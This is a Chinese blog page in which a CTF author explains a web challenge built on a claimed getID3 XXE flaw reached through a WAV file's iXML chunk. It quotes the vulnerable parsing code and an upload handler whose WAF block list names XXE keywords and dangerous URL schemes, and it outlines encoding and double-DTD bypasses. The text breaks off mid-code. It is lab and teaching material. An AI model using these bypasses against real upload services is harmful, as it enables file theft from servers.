@@ -1,0 +1,606 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_a0oqhord1y';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://suc2es2.github.io';</script>
+  <title>
+    出题——G.T.I 巡查团 | 雾島风起時
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_a0oqhord1y.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="出题——G.T.I 巡查团本题来源于三角洲以及最近实战中所打的漏洞 基于 CVE-2026-94108 变种，属于 0day 一类，难度较高，不知道 AI 能不能跑出来 信息收集在源码中发现一段注释，暂且不知道何意为  注册一个账号登录后可以上传媒体文件作为巡查的素材，上传 WAV 是攻击入口  CVE-2026-94108漏洞源码位于 getid3-1.9.26&#x2F;getid3&#x2F;getid3.li">
+<meta property="og:type" content="article">
+<meta property="og:title" content="出题——G.T.I 巡查团">
+<meta property="og:url" content="https://suc2es2.github.io/2026/08/28/%E5%87%BA%E9%A2%98-GTI%20%E5%B7%A1%E6%9F%A5%E5%9B%A2/index.html">
+<meta property="og:site_name" content="雾島风起時">
+<meta property="og:description" content="出题——G.T.I 巡查团本题来源于三角洲以及最近实战中所打的漏洞 基于 CVE-2026-94108 变种，属于 0day 一类，难度较高，不知道 AI 能不能跑出来 信息收集在源码中发现一段注释，暂且不知道何意为  注册一个账号登录后可以上传媒体文件作为巡查的素材，上传 WAV 是攻击入口  CVE-2026-94108漏洞源码位于 getid3-1.9.26&#x2F;getid3&#x2F;getid3.li">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034Tkitb1uKm59qUerPSnR.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034TkvZs99j77AGuAcBOOt.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034U8nLs5ulptftlZNrjLY.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034U8o1LQChw6j5nnUM43X.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034U8tzLDhSqBpobPGS21E.png">
+<meta property="article:published_time" content="2026-08-27T18:39:00.000Z">
+<meta property="article:modified_time" content="2026-09-24T02:47:56.094Z">
+<meta property="article:author" content="ALL">
+<meta property="article:tag" content="OOB 外带">
+<meta property="article:tag" content="UTF-16BE 编码绕过">
+<meta property="article:tag" content="双层 DTD 绕过 libxml 限制">
+<meta property="article:tag" content="盲 XXE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/i/034Tkitb1uKm59qUerPSnR.png">
+    <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="出题——G.T.I 巡查团">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">出题——G.T.I 巡查团</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E2%80%94%E2%80%94G-T-I-%E5%B7%A1%E6%9F%A5%E5%9B%A2"><span class="toc-number">1.</span> <span class="toc-text">出题——G.T.I 巡查团</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2026-94108"><span class="toc-number">1.2.</span> <span class="toc-text">CVE-2026-94108</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UTF-16BE-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">UTF-16BE 编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E5%B1%82-DTD-%E7%BB%95%E8%BF%87-libxml-%E9%99%90%E5%88%B6"><span class="toc-number">1.4.</span> <span class="toc-text">双层 DTD 绕过 libxml 限制</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">253</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">193</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-出题-GTI 巡查团" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-08-27T18:39:00.000Z" itemprop="datePublished">2026-08-28</time>
+    <time style="display: none;" id="post-update-time">2026-09-24</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="出题——G-T-I-巡查团"><a href="#出题——G-T-I-巡查团" class="headerlink" title="出题——G.T.I 巡查团"></a>出题——G.T.I 巡查团</h1><p>本题来源于三角洲以及最近实战中所打的漏洞</p>
+<p>基于 CVE-2026-94108 变种，属于 0day 一类，难度较高，不知道 AI 能不能跑出来</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>在源码中发现一段注释，暂且不知道何意为</p>
+<p><img src="https://pic1.imgdb.cn/i/034Tkitb1uKm59qUerPSnR.png" alt="pasted_1790148599320_py542b.png"></p>
+<p>注册一个账号登录后可以上传媒体文件作为巡查的素材，上传 WAV 是攻击入口</p>
+<p><img src="https://pic1.imgdb.cn/i/034TkvZs99j77AGuAcBOOt.png" alt="pasted_1790159450468_h5mush.png"></p>
+<h2 id="CVE-2026-94108"><a href="#CVE-2026-94108" class="headerlink" title="CVE-2026-94108"></a>CVE-2026-94108</h2><p>漏洞源码位于 <code>getid3-1.9.26/getid3/getid3.lib.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ===== 第 14-20 行：XML 解析选项常量定义 =====</span></span><br><span class="line"><span class="comment">// 只在常量未定义 且 libxml 已加载时执行</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;GETID3_LIBXML_OPTIONS&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">defined</span>(<span class="string">&#x27;LIBXML_VERSION&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">// libxml 版本 &gt;= 2.6.21 时启用 COMPACT 选项</span></span><br><span class="line">    <span class="keyword">if</span> (LIBXML_VERSION &gt;= <span class="number">20621</span>) &#123;</span><br><span class="line">        <span class="comment">// LIBXML_NOENT    ：启用实体替换（XXE 的关键！）</span></span><br><span class="line">        <span class="comment">// LIBXML_NOWARNING：抑制警告</span></span><br><span class="line">        <span class="comment">// LIBXML_COMPACT  ：内存优化</span></span><br><span class="line">        <span class="title function_ invoke__">define</span>(<span class="string">&#x27;GETID3_LIBXML_OPTIONS&#x27;</span>, LIBXML_NOENT | LIBXML_NOWARNING | LIBXML_COMPACT);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">define</span>(<span class="string">&#x27;GETID3_LIBXML_OPTIONS&#x27;</span>, LIBXML_NOENT | LIBXML_NOWARNING);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>LIBXML_NOENT</code> 启用了实体替换——这是 XXE 的前提</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ===== 第 740-760 行：XML2array 函数（PHP &lt; 8.0 分支） =====</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;libxml_disable_entity_loader&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 关闭实体加载器保护（允许加载外部实体）——这是漏洞关键</span></span><br><span class="line">    <span class="variable">$loader</span> = @<span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// 用 GETID3_LIBXML_OPTIONS 解析 XML 字符串</span></span><br><span class="line">    <span class="variable">$XMLobject</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$XMLstring</span>, <span class="string">&#x27;SimpleXMLElement&#x27;</span>, GETID3_LIBXML_OPTIONS);</span><br><span class="line">    <span class="comment">// 转换为数组</span></span><br><span class="line">    <span class="variable">$return</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">SimpleXMLelement2array</span>(<span class="variable">$XMLobject</span>);</span><br><span class="line">    <span class="comment">// 恢复原有的 loader 状态</span></span><br><span class="line">    @<span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="variable">$loader</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关键：</p>
+<ul>
+<li><p><code>libxml_disable_entity_loader(false)</code> —— 允许加载外部实体</p>
+</li>
+<li><p><code>simplexml_load_string</code> 用 <code>GETID3_LIBXML_OPTIONS</code> 传入，包含 <code>LIBXML_NOENT</code></p>
+</li>
+<li><p>传入的 <code>$XMLstring</code> 来自 WAV 文件的 <code>iXML chunk</code></p>
+</li>
+</ul>
+<p>结论：<code>XML2array</code> 对攻击者可控的 XML 字符串进行解析，存在 XXE 漏洞</p>
+<p>读 <code>module.audio-video.riff.php</code>，找到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查 WAV 中是否存在 iXML chunk</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$thisfile_riff_WAVE</span>[<span class="string">&#x27;iXML&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// 把 iXML chunk 里的字符串送进 XML2array 解析</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$parsedXML</span> = getid3_lib::<span class="title function_ invoke__">XML2array</span>(<span class="variable">$thisfile_riff_WAVE</span>[<span class="string">&#x27;iXML&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// 解析成功后，结果存入 info[&#x27;ixml&#x27;]</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;info[<span class="string">&#x27;ixml&#x27;</span>] = <span class="variable">$parsedXML</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要上传的 WAV 文件里有 <code>iXML chunk</code>，其内容就会进入 <code>XML2array</code>，触发 XXE</p>
+<h2 id="UTF-16BE-编码绕过"><a href="#UTF-16BE-编码绕过" class="headerlink" title="UTF-16BE 编码绕过"></a>UTF-16BE 编码绕过</h2><p>WAF 用 <code>stripos($rawBytes, &#39;&lt;!DOCTYPE&#39;)</code> 在原始字节流中搜索。<code>stripos</code> 把 needle 当作 UTF-8&#x2F;ASCII 字节序列处理</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 加载应用引导文件（初始化配置、常量、autoload）</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/includes/bootstrap.php&#x27;</span>;</span><br><span class="line"><span class="comment">// 加载 Composer 自动加载器（getID3 的 autoload 在此注册）</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ===== 1. 登录检查 =====</span></span><br><span class="line"><span class="comment">// 未登录用户直接跳转首页，阻断匿名上传</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title class_">GtiAuth</span>::<span class="title function_ invoke__">isLoggedIn</span>()) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上传目录：&lt;项目根&gt;/uploads</span></span><br><span class="line"><span class="variable">$uploadDir</span> = GTI_ROOT . <span class="string">&#x27;/uploads&#x27;</span>;</span><br><span class="line"><span class="comment">// 允许上传的扩展名白名单（只允许媒体文件）</span></span><br><span class="line"><span class="variable">$allowedExt</span> = <span class="keyword">array</span>(<span class="string">&#x27;mp3&#x27;</span>, <span class="string">&#x27;wav&#x27;</span>, <span class="string">&#x27;flac&#x27;</span>, <span class="string">&#x27;ogg&#x27;</span>, <span class="string">&#x27;m4a&#x27;</span>, <span class="string">&#x27;aac&#x27;</span>, <span class="string">&#x27;mp4&#x27;</span>, <span class="string">&#x27;webm&#x27;</span>, <span class="string">&#x27;avi&#x27;</span>, <span class="string">&#x27;mov&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// ===== 2. 上传字段校验 =====</span></span><br><span class="line">    <span class="comment">// 表单字段名必须为 media_file</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;media_file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;请选择要上传的媒体文件。&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;media_file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="comment">// 上传过程本身出错（超过 php.ini 限制、传输中断等）</span></span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;上传失败，错误码：&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;media_file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$origName</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;media_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];      <span class="comment">// 用户原始文件名</span></span><br><span class="line">        <span class="variable">$tmpPath</span>  = <span class="variable">$_FILES</span>[<span class="string">&#x27;media_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];  <span class="comment">// PHP 临时文件路径</span></span><br><span class="line">        <span class="variable">$ext</span>      = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$origName</span>, PATHINFO_EXTENSION)); <span class="comment">// 小写扩展名</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ===== 3. 扩展名白名单校验 =====</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allowedExt</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&#x27;不支持的文件类型。&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$tmpPath</span>)) &#123;</span><br><span class="line">            <span class="comment">// 防止伪造 $_FILES 绕过 HTTP 上传</span></span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&#x27;非法上传来源。&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// ===== 4. 生成目标文件名 =====</span></span><br><span class="line">            <span class="comment">// 拼接格式：&lt;用户名&gt;_&lt;时间戳&gt;_&lt;md5前8位&gt;.&lt;扩展名&gt;</span></span><br><span class="line">            <span class="variable">$username</span> = <span class="title class_">GtiAuth</span>::<span class="title function_ invoke__">currentUsername</span>();</span><br><span class="line">            <span class="variable">$filename</span> = <span class="variable">$username</span> . <span class="string">&#x27;_&#x27;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>) . <span class="string">&#x27;_&#x27;</span> </span><br><span class="line">                      . <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$origName</span> . <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>)), <span class="number">0</span>, <span class="number">8</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">            <span class="variable">$destAbs</span> = <span class="variable">$uploadDir</span> . DIRECTORY_SEPARATOR . <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ===== 5. 落盘 =====</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpPath</span>, <span class="variable">$destAbs</span>)) &#123;</span><br><span class="line">                <span class="variable">$error</span> = <span class="string">&#x27;保存文件失败，请检查 uploads 目录权限。&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$savedRel</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// ========== WAF 检查（关键点 1） ==========</span></span><br><span class="line">                <span class="comment">// 关键字黑名单：覆盖 XXE 常见关键词</span></span><br><span class="line">                <span class="variable">$wafBlocked</span> = <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;&lt;!DOCTYPE&#x27;</span>, <span class="string">&#x27;&lt;!ENTITY&#x27;</span>, <span class="string">&#x27;SYSTEM&#x27;</span>, <span class="string">&#x27;PUBLIC&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;%remote&#x27;</span>, <span class="string">&#x27;%send&#x27;</span>, <span class="string">&#x27;%file&#x27;</span>, <span class="string">&#x27;%eval&#x27;</span>, <span class="string">&#x27;%all&#x27;</span>, <span class="string">&#x27;%second&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;evil.dtd&#x27;</span>, <span class="string">&#x27;evil2.dtd&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;file://&#x27;</span>, <span class="string">&#x27;php://&#x27;</span>, <span class="string">&#x27;gopher://&#x27;</span>, <span class="string">&#x27;expect://&#x27;</span>, <span class="string">&#x27;data:&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;https://&#x27;</span>,</span><br><span class="line">                );</span><br><span class="line">                <span class="comment">// 读取上传文件的原始字节流（不做任何解码/转换）</span></span><br><span class="line">                <span class="variable">$rawBytes</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$destAbs</span>);</span><br><span class="line">                <span class="variable">$wafHit</span> = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$rawBytes</span> !== <span class="literal">false</span> &amp;&amp; <span class="variable">$rawBytes</span> !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">                    <span class="comment">// 逐关键字做大小写不敏感的字节级搜索</span></span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$wafBlocked</span> <span class="keyword">as</span> <span class="variable">$needle</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span 